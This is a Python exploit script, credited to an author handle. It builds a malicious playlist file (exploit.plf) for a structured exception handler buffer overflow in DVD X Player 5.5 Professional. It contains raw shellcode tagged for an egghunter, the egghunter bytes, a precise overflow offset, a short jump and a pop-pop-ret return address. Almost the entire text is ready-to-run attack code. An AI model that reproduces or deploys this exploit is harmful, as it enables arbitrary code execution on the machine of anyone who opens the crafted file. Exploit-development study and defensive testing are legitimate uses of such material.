# Author: w4fz5uck5 -> https://github.com/w4fz5uck5

import socket,struct

shellcode = (
"w00tw00t" # w00tw00t string at beginning to be find by egghunter
 "\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd" 
)

egghunter = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD"
             "\x2E\x3C\x05\x5A\x74\xEF\xB8"
             "\x77\x30\x30\x74" # w00t
             "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

payload = shellcode + "A" * (608 - len(shellcode))

payload += "\xEB\x06\x90\x90" # nseh
payload += struct.pack("I", 0x6403468B) #pop pop ret (SEH)
payload += egghunter # The egghunter code will search on stack for the strings
                     # w00tw00t and execute that remain after it
payload += "\x90" * 300 # Padding

print "------DVD-X-Player-5.5-Professional-Buffer-Overflow-SEH+Egghunting------"
try:
    print "[+] Success attempt to write file: exploit.plf" 
    open("exploit.plf", "wb").write(payload+"\x00")
except Exception as e:
    print e
